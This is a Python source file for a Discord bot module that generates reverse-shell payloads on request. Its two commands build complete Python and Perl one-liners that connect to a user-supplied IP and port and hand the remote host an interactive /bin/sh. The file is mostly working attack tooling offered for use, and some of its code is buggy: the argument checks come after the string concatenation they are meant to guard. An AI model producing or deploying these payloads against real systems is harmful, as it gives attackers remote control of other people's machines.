import discord
from discord.ext import commands

class reverse_shells(commands.Cog):

    def __init__(self, bot):
        self.bot = bot
        print('[LOGS] Cog "{}" loaded'.format(self.__class__.__name__))

    @commands.command()
    async def genShellPy(self, ctx, ip=None, port=None):
        pyBeginning = 'python -c '
        pyShell = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((' + ip + ',' \
                + port + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([' \
                       '"/bin/sh","-i"]); '
        if ip is None:
            print('\n[LOGS] Must enter a ip!')
            await ctx.send('Please enter a ip!')
        elif port is None:
            print('\n[LOGS] Must enter a port!')
            await ctx.send('Please enter a port!')
        else:
            print(f'\n[LOGS] Generating reverse python shell on {ip} and {port}!')
            await ctx.send(pyBeginning + pyShell)

    @commands.command()
    async def genShellPerl(self, ctx, ip=None, port=None):
        perlBeginning = 'perl -e '
        perlShell = 'use Socket;$i=`' + ip + '`;$p=' + port + ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(' \
                                                              'connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,' \
                                                              '">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh ' \
                                                              '-i");}; '
        if ip is None:
            print('\n[LOGS] Must enter a ip!')
            await ctx.send('Please enter a ip!')
        elif port is None:
            print('\n[LOGS] Must enter a port!')
            await ctx.send('Please enter a port!')
        else:
            print(f'\n[LOGS] Generating reverse perl shell on {ip} and {port}!')
            await ctx.send(perlBeginning + perlShell)

def setup(bot):
    bot.add_cog(reverse_shells(bot))
    